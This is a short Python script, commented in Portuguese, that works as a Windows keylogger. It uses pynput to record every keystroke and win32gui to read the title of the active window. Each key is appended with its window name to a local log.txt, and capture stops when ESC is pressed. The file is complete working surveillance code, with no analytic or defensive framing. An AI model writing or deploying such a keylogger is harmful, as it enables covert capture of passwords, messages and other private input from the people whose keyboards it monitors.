from pynput import keyboard
import win32gui   # pip install pywin32

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def janela_ativa():
    """Retorna o título da janela atualmente em foco no Windows."""
    janela = win32gui.GetForegroundWindow()
    titulo = win32gui.GetWindowText(janela)
    return titulo if titulo else "Janela desconhecida"

def registrar(texto):
    """Grava texto no log com o nome da janela ativa (sem data/hora)."""
    janela = janela_ativa()
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(f"[{janela}] {texto}\n")

def on_press(key):
    try:
        # Teclas comuns (letras, números, etc.)
        registrar(f"Tecla: {key.char}")
    except AttributeError:
        # Teclas especiais
        if key == keyboard.Key.space:
            registrar("Tecla: [SPACE]")
        elif key == keyboard.Key.enter:
            registrar("Tecla: [ENTER]")
        elif key == keyboard.Key.tab:
            registrar("Tecla: [TAB]")
        elif key == keyboard.Key.backspace:
            registrar("Tecla: [BACKSPACE]")
        elif key == keyboard.Key.esc:
            registrar("Tecla: [ESC] - Encerrando captura")
            print("🚪 Encerrando captura...")
            return False
        elif key in IGNORAR:
            pass
        else:
            registrar(f"Tecla especial: [{key}]")

# Inicia o listener e mantém rodando até ESC
with keyboard.Listener(on_press=on_press) as listener:
    print("📡 Capturando teclas e janelas... pressione ESC para parar.")
    listener.join()
